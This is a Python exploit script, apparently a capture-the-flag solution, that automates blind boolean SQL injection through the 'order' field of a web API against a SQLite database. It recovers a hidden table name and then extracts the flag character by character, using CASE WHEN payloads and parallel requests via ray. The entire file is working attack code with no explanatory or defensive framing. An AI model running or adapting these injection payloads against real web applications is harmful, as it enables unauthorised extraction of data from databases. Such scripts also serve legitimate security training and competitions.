from requests import Session
from string import printable
from pwn import log

s = Session()

### Table name
"""
table_injection_base = "(CASE WHEN (SELECT UNICODE(SUBSTR(tbl_name, %d, 1)) FROM sqlite_master)=%d THEN id ELSE emoji END) ASC"
table_name = "flag_"

for pos in range(10):
    for c in "0123456789abcdef":
        t = table_injection_base % (pos + 6, ord(c))
        r = s.post("http://server/api/list", data={"order": t})
        if r.json()[0]["id"] == 1:
            table_name = table_name + c
            print(table_name)
            break

"""

table_name = "flag_230e528ce7"
flag_injection_base = "(CASE WHEN (SELECT UNICODE(SUBSTR(flag, %d, 1)) FROM " + table_name + ")=%d THEN id ELSE emoji END) ASC"

import ray
ray.init(include_dashboard=False)

@ray.remote
def check(test):
    t = flag_injection_base % (len(test), ord(test[-1]))
    r = s.post("http://server/api/list", data={"order": t})
    return test[-1], r.json()[0]["id"] == 1

known = ""

while True:
    log.success("Current flag: " + known)
    gets = []
    # Order these such that the characters we expect are first
    for i in "".join(printable):
        gets.append(check.remote(known+i))
    total = len(gets)
    # Get as results come, break on first True
    fl = []
    p = log.progress("Testing characters")
    p.status("Remaining %d/%d" % (total, total))
    while True:
        ready = ray.wait(gets)[0]
        res = ray.get(ready)
        for o in ready: gets.remove(o)
        p.status("Remaining %d/%d" % (len(gets), total))
        fl += list(filter(lambda x: x[1] == True, res))
        if len(fl) > 0:
            break
        if len(gets) <= 1: break
    p.success("Done")
    for o in gets: ray.cancel(o, force=True)
    known += fl[0][0]
    if known[-1] == "}": break

log.success("Flag: " + known)
